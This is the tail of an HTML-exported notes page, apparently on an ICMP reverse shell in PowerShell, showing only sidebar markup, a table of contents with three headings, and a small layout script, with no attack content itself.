			<div class="graph-icon graph-expand" role="button" aria-label="Expand" data-tooltip-position="top"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg></div>
			<canvas id="graph-canvas" class="hide" width="512px" height="512px"></canvas>
		</div>
		</div></div><div class="tree-container mod-root nav-folder tree-item outline-tree" data-depth="0"><div class="tree-header"><span class="sidebar-section-header">Table Of Contents</span><button class="clickable-icon collapse-tree-button" aria-label="Collapse All"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></svg></button></div><div class="tree-scroll-area tree-item-children nav-folder-children"><div class="tree-item mod-tree-folder nav-folder mod-collapsible is-collapsed" style="display: none;"></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\windows\icmp-reverse-shell-(powershell).html#ICMP Reverse Shell (PowerShell)"><div class="tree-item-contents heading-link" heading-name="ICMP Reverse Shell (PowerShell)"><span class="tree-item-title">ICMP Reverse Shell (PowerShell)</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\windows\icmp-reverse-shell-(powershell).html#ICMP"><div class="tree-item-contents heading-link" heading-name="ICMP"><span class="tree-item-title">ICMP</span></div></a><div class="tree-item-children nav-folder-children"></div></div><div class="tree-item" data-depth="1"><a class="tree-link" href="notes\4.-cybersecurity\redteam\pentesting\sistemas\2.-fases-auditoria\2.-explotación\vulnerabilidades\windows\icmp-reverse-shell-(powershell).html#Abuso"><div class="tree-item-contents heading-link" heading-name="Abuso"><span class="tree-item-title">Abuso</span></div></a><div class="tree-item-children nav-folder-children"></div></div></div></div></div><script defer="">let rs = document.querySelector(".sidebar-right"); rs.classList.add("is-collapsed"); if (window.innerWidth > 768) rs.classList.remove("is-collapsed"); rs.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-right-width"));</script></div></div></body></html>